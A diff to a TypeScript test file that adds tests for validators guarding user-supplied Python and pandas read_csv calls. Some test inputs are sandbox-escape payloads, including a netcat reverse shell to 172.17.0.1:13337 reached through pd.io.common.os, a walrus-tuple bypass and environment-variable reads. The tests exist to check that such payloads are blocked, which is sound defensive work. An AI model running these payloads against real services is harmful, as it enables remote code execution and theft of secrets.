@@ -1,4 +1,4 @@
-import { validatePythonCodeForDataFrame } from './pythonCodeValidator'
+import { validateCustomReadCSVFunction, validatePythonCodeForDataFrame } from './pythonCodeValidator'
 
 describe('validatePythonCodeForDataFrame', () => {
     describe('reported bypass: multi-name import with alias', () => {
@@ -228,6 +228,18 @@ describe('validatePythonCodeForDataFrame', () => {
             expect(result.valid).toBe(false)
             expect(result.reason).toContain('requests module')
         })
+
+        it('should block dangerous modules reached through pandas internals', () => {
+            const result = validatePythonCodeForDataFrame('pd.io.common.os.system("/usr/bin/nc 172.17.0.1 13337 -e /bin/sh")')
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('os module')
+        })
+
+        it('should block process execution even if the module was aliased first', () => {
+            const result = validatePythonCodeForDataFrame('_m.system("/usr/bin/nc 172.17.0.1 13337 -e /bin/sh")')
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('process execution function')
+        })
     })
 
     describe('reflection dunder attributes are blocked', () => {
@@ -344,6 +356,131 @@ describe('validatePythonCodeForDataFrame', () => {
         it('should handle multi-line valid code', () => {
             const code = ["survived = df[df['Survived'] == 1]", 'count = len(survived)', 'count'].join('\n')
             expect(validatePythonCodeForDataFrame(code).valid).toBe(true)
+        })
+    })
+})
+
+describe('validateCustomReadCSVFunction', () => {
+    describe('legitimate read_csv calls pass validation', () => {
+        it('should allow the default read_csv(csv_data) call', () => {
+            expect(validateCustomReadCSVFunction('read_csv(csv_data)').valid).toBe(true)
+        })
+
+        it('should allow literal keyword options', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, sep=';', header=0, keep_default_na=False)")
+            expect(result.valid).toBe(true)
+        })
+
+        it('should allow spaces around keyword equals', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, sep = ';', header = 0)")
+            expect(result.valid).toBe(true)
+        })
+
+        it('should allow statement separator characters inside string literals', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, sep=';', lineterminator='\\n')")
+            expect(result.valid).toBe(true)
+        })
+
+        it('should allow literal lists, tuples, and dictionaries for read_csv options', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, usecols=['Name', 'Age'], na_values={'Age': ['NA', '']})")
+            expect(result.valid).toBe(true)
+        })
+
+        it('should allow spaces around dictionary colons and a trailing dictionary comma', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, na_values={'Age' : ['NA'],})")
+            expect(result.valid).toBe(true)
+        })
+
+        it('should allow filepath_or_buffer=csv_data as the explicit source', () => {
+            const result = validateCustomReadCSVFunction("read_csv(filepath_or_buffer=csv_data, encoding='utf-8')")
+            expect(result.valid).toBe(true)
+        })
+    })
+
+    describe('code execution bypasses are blocked', () => {
+        it('should block the reported walrus tuple bypass in the read_csv source argument', () => {
+            const result = validateCustomReadCSVFunction(
+                'read_csv((_m := pd.io.common.os, _m.system("/usr/bin/nc 172.17.0.1 13337 -e /bin/sh")))'
+            )
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('read from csv_data directly')
+        })
+
+        it('should block dangerous attribute access in read_csv keyword values', () => {
+            const result = validateCustomReadCSVFunction('read_csv(csv_data, storage_options=pd.io.common.os.environ)')
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('option values must be')
+        })
+
+        it('should block nested function calls in read_csv keyword values', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, sep=str(','))")
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('option values must be')
+        })
+
+        it('should block lambda converters in read_csv keyword values', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, converters={'Name': lambda value: value})")
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('option values must be')
+        })
+
+        it('should block positional arguments after csv_data', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, ';')")
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('keyword arguments')
+        })
+
+        it('should block empty arguments', () => {
+            const result = validateCustomReadCSVFunction('read_csv(csv_data,, header=0)')
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('empty arguments')
+        })
+
+        it('should block a trailing comma', () => {
+            const result = validateCustomReadCSVFunction('read_csv(csv_data, header=0,)')
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('empty arguments')
+        })
+
+        it('should block duplicate keyword arguments', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, sep=',', sep=';')")
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('duplicated')
+        })
+
+        it('should block duplicate filepath_or_buffer when source is named', () => {
+            const result = validateCustomReadCSVFunction("read_csv(filepath_or_buffer=csv_data, filepath_or_buffer='other.csv')")
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('duplicated')
+        })
+
+        it('should block filepath_or_buffer override when source is positional', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, filepath_or_buffer='other.csv')")
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('duplicated')
+        })
+
+        it('should block malformed bracket nesting', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data, usecols=['Name', 'Age')")
+            expect(result.valid).toBe(false)
+        })
+
+        it('should block top-level semicolon statement chaining', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data); pd.io.common.os.system('id')")
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('single function call')
+        })
+
+        it('should block overlong custom read_csv input', () => {
+            const result = validateCustomReadCSVFunction(`read_csv(csv_data, sep='${'a'.repeat(1024)}')`)
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('1024 characters or fewer')
+        })
+
+        it('should block trailing code after the read_csv call', () => {
+            const result = validateCustomReadCSVFunction("read_csv(csv_data) or pd.io.common.os.system('id')")
+            expect(result.valid).toBe(false)
+            expect(result.reason).toContain('exactly one complete')
         })
     })
 })
